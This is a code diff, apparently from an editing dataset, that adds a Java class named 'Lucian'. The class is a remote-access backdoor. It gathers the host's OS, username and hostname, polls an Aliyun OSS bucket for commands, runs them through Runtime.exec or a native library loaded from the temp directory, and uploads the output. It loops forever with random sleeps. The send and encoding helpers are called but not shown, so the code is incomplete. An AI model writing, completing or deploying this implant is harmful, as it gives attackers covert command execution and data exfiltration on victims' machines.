@@ -1,0 +1,152 @@
+<|editable_region_start|>
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+import javax.net.ssl.HostnameVerifier;
+import javax.net.ssl.HttpsURLConnection;
+import javax.net.ssl.SSLSession;
+import java.io.*;
+import java.net.HttpURLConnection;
+import java.net.InetAddress;
+import java.net.URL;
+import java.net.UnknownHostException;
+import java.text.SimpleDateFormat;
+import java.util.*;
+
+
+public class Lucian {
+
+
+    private static String type = "OSS";
+
+    private static String endpoint = "https://xxxx.oss-cn-hangzhou.aliyuncs.com/";
+
+    private static String bucketname = "/";
+
+    private static String path = "/";
+
+    private static String accessKeyId = "your_access_key_id";
+
+    private static String accessKeySecret = "your_access_key_secret";
+
+    private static boolean debug_mode = true;
+
+    private static boolean idle = true;
+
+    private static boolean silent = false;
+
+    private static boolean persist = false;
+
+    private static boolean lucian = true;
+
+    private static final String UID = String.valueOf(UUID.randomUUID());
+
+    private static Object obj = "";
+
+    private static URL OSSObjectURL = null;
+
+    private static String meta = "";
+
+
+    public native static String gccjvm(String string);
+
+    public static void main(String[] args) {
+        try {
+
+
+            new Lucian().lucian();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    public static void init() {
+        try {
+
+            String jnilib = System.getProperty("java.io.tmpdir") + "/falconlib.so";
+            if (System.getProperty("java.version").contains("1.8.") && "64".equals(System.getProperty("sun.arch.data.model")) && !jnilib.isEmpty() && System.getProperty("os.name").toLowerCase().contains("linux")) {
+                File dllFile = new File(jnilib);
+                if (dllFile.exists()) {
+                    try {
+                        System.load(jnilib);
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            }
+
+            String hostname = "";
+            try {
+                hostname = InetAddress.getLocalHost().getHostName();
+            } catch (UnknownHostException e) {
+                hostname = "hosterror";
+            }
+            String platform = System.getProperty("os.name");
+            String username = System.getProperty("user.name");
+
+            meta = enCode64((platform + "|" + username + "|" + hostname));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+
+    public void lucian()
+            throws Exception {
+
+        Lucian.init();
+        if (bucketname.isEmpty() || endpoint.isEmpty() || type.isEmpty()) {
+            System.exit(1);
+        }
+
+        if (
+                (endpoint.startsWith("https"))) {
+            OSSObjectURL = new URL(endpoint + bucketname + path + UID);
+        } else {
+            OSSObjectURL = new URL("http://" + bucketname + "." + endpoint.substring(7) + path + UID);
+        }
+        runLucian();
+    }
+
+    private static void runLucian() {
+        try {
+
+            String last = "";
+            for (; ; ) {
+
+
+                if (lucian) {
+                    lucian = false;
+                    send("", "", "PUT");
+                }
+                String cmdline = send("", "", "HEAD");
+                if (cmdline == null) {
+                    continue;
+                }
+                if ((!"".equals(cmdline)) && (!last.equals(cmdline))) {
+                    try {
+
+                        if (cmdline.startsWith("#")) {
+                            String res = gccjvm(cmdline.substring(1, cmdline.length()));
+                            send(res, cmdline, "PUT");
+
+                        } else {
+                            Scanner s = new Scanner(Runtime.getRuntime().exec(cmdline).getInputStream()).useDelimiter(
+                                    "\\A");
+                            send(s.hasNext() ? s.next() : "", cmdline, "PUT");
+                        }
+
+                    } catch (Exception e) {
+                        send(e.getLocalizedMessage(), cmdline, "PUT");
+                    }
+                    last = cmdline;
+                }
+                Thread.sleep(new Random().nextInt(10) * 1 * 1000);
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+<|editable_region_end|>
+```
